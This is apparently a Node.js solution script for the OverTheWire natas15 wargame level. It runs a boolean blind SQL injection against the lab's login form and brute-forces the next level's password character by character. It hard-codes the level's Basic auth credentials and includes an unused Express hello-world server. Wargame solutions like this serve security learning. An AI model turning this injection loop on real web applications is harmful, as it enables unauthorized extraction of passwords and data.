const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

const headers = {
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
}
async function req(ch) {
    const res = await axios.post('http://natas15.natas.labs.overthewire.org/index.php', `username=natas16%22+and+password+like+binary+%22${ch}%25`, {headers});
    if(res.data.includes('This user exists.')) {
        return true;
    } else {
        return false;
    }
}

async function calc() {
    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
    let ans = 'WaIHEacj63wnNIBROHeqi3p9t0m5n';
    
    for(let i=0; i<alphanum.length; i++) {
        let val = await req(ans + alphanum[i]);
        if(val) {
            ans += alphanum[i];
            console.log(ans);
            i = -1;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));